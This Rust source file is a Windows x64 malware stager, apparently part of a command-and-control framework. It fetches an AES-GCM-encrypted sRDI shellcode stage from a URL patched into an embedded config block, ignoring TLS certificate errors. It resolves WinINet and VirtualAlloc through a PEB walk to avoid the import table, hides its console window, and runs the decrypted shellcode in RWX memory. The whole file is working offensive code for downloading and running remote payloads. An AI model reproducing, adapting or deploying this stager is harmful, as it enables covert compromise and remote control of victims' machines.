// Rust stager — Windows x64. Downloads stage-2 (sRDI shellcode) over HTTP,
// AES-GCM decrypts it, VirtualAlloc + copy + jump. Config (stage URL + AES key)
// is embedded in a fixed-size region at a known offset and patched at payload
// generation time (see internal/stager/patch_rust.go), so no recompilation is
// needed per payload — the same "template + patch" model as the C stager.
//
// Wire protocol (matches the Go stager):
//   GET <url>          → 200 JSON {"data":"<base64 AES-GCM ciphertext>"}
//   decrypt with key   → sRDI shellcode (self-locating)
//   VirtualAlloc RWX   → copy → jump

#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::Aes256Gcm;
use base64::Engine;

/// Fixed-size embedded config block: URL(256) + key-b64(64). The server locates
/// this region in the compiled template by searching for the sentinel key
/// value (all 0xCC) and patches URL + key.
pub const CONFIG_LEN: usize = 320;
pub static mut CONFIG: [u8; CONFIG_LEN] = [0xCC; CONFIG_LEN];

fn cfg() -> (String, String) {
    unsafe {
        let url = trim_nul(&CONFIG[0..256]);
        let key = trim_nul(&CONFIG[256..320]);
        (url, key)
    }
}

fn trim_nul(b: &[u8]) -> String {
    let end = b.iter().position(|&c| c == 0).unwrap_or(b.len());
    String::from_utf8_lossy(&b[..end]).into_owned()
}

fn main() {
    let (url, key_b64) = cfg();
    if url.is_empty() || key_b64.is_empty() {
        std::process::exit(1);
    }

    // 1. Download stage-2.
    let body = http_get(&url).unwrap_or_else(|_| std::process::exit(1));

    // 2. Parse JSON {"data":"<b64>"}.
    let data_b64 = parse_data_field(&body).unwrap_or_else(|_| std::process::exit(1));
    let ct = base64::engine::general_purpose::STANDARD
        .decode(data_b64.as_bytes())
        .unwrap_or_else(|_| std::process::exit(1));

    // 3. AES-GCM decrypt.
    let key = base64::engine::general_purpose::STANDARD
        .decode(key_b64.as_bytes())
        .unwrap_or_else(|_| std::process::exit(1));
    let plain = aes_gcm_decrypt(&key, &ct).unwrap_or_else(|_| std::process::exit(1));

    // 4. VirtualAlloc RWX + copy + jump.
    exec_shellcode(&plain);
}

/// Download a URL body over HTTP(S) using WinINet (wininet.dll). WinINet is a
/// native Windows API with built-in TLS and no extra binary weight, and we can
/// ignore self-signed certificates — matching the C2's HTTPS behavior. Resolves
/// wininet exports via PEB walk (no IAT).
fn http_get(url: &str) -> Result<Vec<u8>, String> {
    let wininet = find_module("wininet.dll");
        if wininet == 0 {
            return Err("wininet.dll not found".into());
        }
        let iopen = export_by_name(wininet, "InternetOpenA");
        let iopenurl = export_by_name(wininet, "InternetOpenUrlA");
        let iread = export_by_name(wininet, "InternetReadFile");
        let iclose = export_by_name(wininet, "InternetCloseHandle");
        if iopen == 0 || iopenurl == 0 || iread == 0 || iclose == 0 {
            return Err("wininet exports unresolved".into());
        }

        // InternetOpenA(agent, accessType=PRECONFIG, proxy, bypass, flags=0)
        let h_inet = call5(iopen, 0, 0, 0, 0, 0);
        if h_inet == 0 {
            return Err("InternetOpenA failed".into());
        }

        let is_https = url.starts_with("https://");
        // Security ignore flags (skip self-signed validation like the agent's
        // insecure TLS): IGNORE_CERT_CN_INVALID | IGNORE_CERT_DATE_INVALID |
        // IGNORE_UNKNOWN_CA.
        let mut flags: usize = 0x8000_0000 // INTERNET_FLAG_RELOAD
            | 0x0400_0000 // INTERNET_FLAG_NO_CACHE_WRITE
            | 0x0040_0000 // INTERNET_FLAG_KEEP_CONNECTION
            | 0x0000_1000 // INTERNET_FLAG_IGNORE_CERT_CN_INVALID
            | 0x0000_2000 // INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
            | 0x0000_4000 // INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS
            | 0x0000_8000 // INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP
            | 0x0000_0100; // SECURITY_FLAG_IGNORE_UNKNOWN_CA
        if is_https {
            flags |= 0x0080_0000; // INTERNET_FLAG_SECURE
        }

        let url_c = url.as_bytes();
        let url_c = {
            let mut v = url_c.to_vec();
            v.push(0);
            v
        };
        // InternetOpenUrlA(hInet, url, headers=0, headersLen=0, flags, context=0)
        let h_url = call6(iopenurl, h_inet, url_c.as_ptr() as usize, 0, 0, flags, 0);
        let _ = call1(iclose, h_inet);
        if h_url == 0 {
            return Err("InternetOpenUrlA failed".into());
        }

        let mut body = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            let mut read: u32 = 0;
            // InternetReadFile(hFile, buf, len, &read) → BOOL
            let ok = call4(iread, h_url, buf.as_mut_ptr() as usize, buf.len(), &mut read as *mut u32 as usize);
            if ok == 0 {
                let _ = call1(iclose, h_url);
                return Err("InternetReadFile failed".into());
            }
            if read == 0 {
                break;
            }
            body.extend_from_slice(&buf[..read as usize]);
        }
        let _ = call1(iclose, h_url);
        Ok(body)
}

/// Extract the `"data"` string field from a JSON body.
fn parse_data_field(body: &[u8]) -> Result<String, String> {
    let s = String::from_utf8_lossy(body);
    let s = s.trim();
    let key = "\"data\":";
    let i = s.find(key).ok_or("no data field")?;
    let after = &s[i + key.len()..].trim_start();
    let val = after.trim_start_matches('"');
    let end = val.find('"').ok_or("unterminated data")?;
    Ok(val[..end].to_string())
}

fn aes_gcm_decrypt(key: &[u8], ct: &[u8]) -> Result<Vec<u8>, String> {
    let cipher = Aes256Gcm::new_from_slice(key).map_err(|e| e.to_string())?;
    let nonce_len = 12; // AES-GCM standard nonce size (matches Go cipher.NewGCM)
    if ct.len() < nonce_len {
        return Err("ciphertext too short".into());
    }
    let (nonce, data) = ct.split_at(nonce_len);
    let nonce: [u8; 12] = nonce.try_into().map_err(|_| "bad nonce")?;
    cipher
        .decrypt(&nonce.into(), data)
        .map_err(|e| format!("aes-gcm decrypt: {e:?}"))
}

/// VirtualAlloc RWX + copy + call.
fn exec_shellcode(sc: &[u8]) {
    unsafe {
        let alloc = windows_alloc;
        let addr = alloc(sc.len());
        if addr == 0 {
            std::process::exit(1);
        }
        std::ptr::copy_nonoverlapping(sc.as_ptr(), addr as *mut u8, sc.len());
        let f: extern "C" fn() = std::mem::transmute(addr);
        f();
    }
}

extern "system" fn windows_alloc(size: usize) -> usize {
    // Resolve VirtualAlloc from kernel32 via a raw call.
    let kernel32 = find_module("kernel32.dll");
    if kernel32 == 0 {
        return 0;
    }
    let valloc = export_by_name(kernel32, "VirtualAlloc");
    if valloc == 0 {
        return 0;
    }
    // VirtualAlloc(lpAddress=0, dwSize, flAllocationType=MEM_COMMIT|MEM_RESERVE,
    //              flProtect=PAGE_EXECUTE_READWRITE=0x40)
    call4(valloc, 0, size, 0x3000, 0x40)
}

/// Find a module base via PEB walk (InMemoryOrderModuleList) by base name.
fn find_module(module_name: &str) -> usize {
    unsafe {
        let teb = read_gs(0x30);
        let peb = *(teb as *const usize);
        let ldr = *((peb + 0x18) as *const usize);
        let list_head = ldr + 0x20;
        let mut flink = *(list_head as *const usize);
        let first = list_head;
        while flink != 0 && flink != first {
            let entry = flink - 0x10;
            let name_ptr = entry + 0x38;
            let len = *(name_ptr as *const u16) as usize / 2;
            let buf = *((name_ptr + 8) as *const usize) as *const u16;
            if len > 0 && len < 64 {
                let name: Vec<u16> = std::slice::from_raw_parts(buf, len).to_vec();
                let s = String::from_utf16_lossy(&name);
                if s.eq_ignore_ascii_case(module_name) {
                    return *((entry + 0x20) as *const usize);
                }
            }
            flink = *(flink as *const usize);
        }
        0
    }
}

unsafe fn read_gs(off: u32) -> usize {
    let mut v: usize = 0;
    core::arch::asm!("mov {v}, gs:[{off}]", v = out(reg) v, off = in(reg) off as usize, options(nostack, preserves_flags));
    v
}

/// Resolve an export by name (hash-free, uses the string directly — fine for
/// a stager that is not hiding its imports).
fn export_by_name(module: usize, name: &str) -> usize {
    unsafe {
        let dos = module as *const u16;
        if *dos != 0x5A4D {
            return 0;
        }
        let lfanew = *( (module + 2) as *const i32 ) as usize;
        let nt = module + lfanew;
        if *(nt as *const u32) != 0x00004550 {
            return 0;
        }
        let opt = nt + 24;
        let edir = *( (opt + 0x70 + 0) as *const u32 ); // DataDirectory[0].VirtualAddress
        if edir == 0 {
            return 0;
        }
        let exp = module + edir as usize;
        let n_names = *( (exp + 24) as *const u32 );
        let _n_funcs = *( (exp + 20) as *const u32 );
        let addr_of_funcs = *( (exp + 28) as *const u32 );
        let addr_of_names = *( (exp + 32) as *const u32 );
        let addr_of_ords = *( (exp + 36) as *const u32 );
        let names = module + addr_of_names as usize;
        let funcs = module + addr_of_funcs as usize;
        let ords = module + addr_of_ords as usize;
        for i in 0..n_names {
            let mut nptr = module + *( (names + i as usize * 4) as *const u32 ) as usize;
            let mut j = 0;
            let mut ok = true;
            let nb = name.as_bytes();
            loop {
                let c = *(nptr as *const u8);
                if c == 0 {
                    break;
                }
                if j >= nb.len() || c != nb[j] {
                    ok = false;
                    break;
                }
                j += 1;
                nptr += 1;
            }
            if ok && j == nb.len() {
                let ord = *( (ords + i as usize * 2) as *const u16 ) as usize;
                let rva = *( (funcs + ord * 4) as *const u32 );
                return module + rva as usize;
            }
        }
        0
    }
}

/// Call a 4-arg WinAPI function (x64 ABI).
extern "system" fn call4(proc: usize, a1: usize, a2: usize, a3: usize, a4: usize) -> usize {
    unsafe {
        let ret: usize;
        core::arch::asm!(
            "sub rsp, 0x28",
            "mov r10, rcx",
            "call {proc}",
            "add rsp, 0x28",
            proc = in(reg) proc,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            lateout("rax") ret,
            options(nostack)
        );
        ret
    }
}

/// Call a 1-arg WinAPI function.
extern "system" fn call1(proc: usize, a1: usize) -> usize {
    unsafe {
        let ret: usize;
        core::arch::asm!(
            "sub rsp, 0x28",
            "mov r10, rcx",
            "call {proc}",
            "add rsp, 0x28",
            proc = in(reg) proc,
            in("rcx") a1,
            lateout("rax") ret,
            options(nostack)
        );
        ret
    }
}

/// Call a 5-arg WinAPI function (x64 ABI: 5th arg at [rsp+0x28]).
extern "system" fn call5(proc: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> usize {
    unsafe {
        let ret: usize;
        core::arch::asm!(
            "sub rsp, 0x30",
            "mov [rsp+0x28], {a5}",
            "mov r10, rcx",
            "call {proc}",
            "add rsp, 0x30",
            proc = in(reg) proc,
            a5 = in(reg) a5,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            lateout("rax") ret,
            options(nostack)
        );
        ret
    }
}

/// Call a 6-arg WinAPI function (5th at [rsp+0x28], 6th at [rsp+0x30]).
extern "system" fn call6(proc: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) -> usize {
    unsafe {
        let ret: usize;
        core::arch::asm!(
            "sub rsp, 0x38",
            "mov [rsp+0x28], {a5}",
            "mov [rsp+0x30], {a6}",
            "mov r10, rcx",
            "call {proc}",
            "add rsp, 0x38",
            proc = in(reg) proc,
            a5 = in(reg) a5,
            a6 = in(reg) a6,
            in("rcx") a1,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            lateout("rax") ret,
            options(nostack)
        );
        ret
    }
}
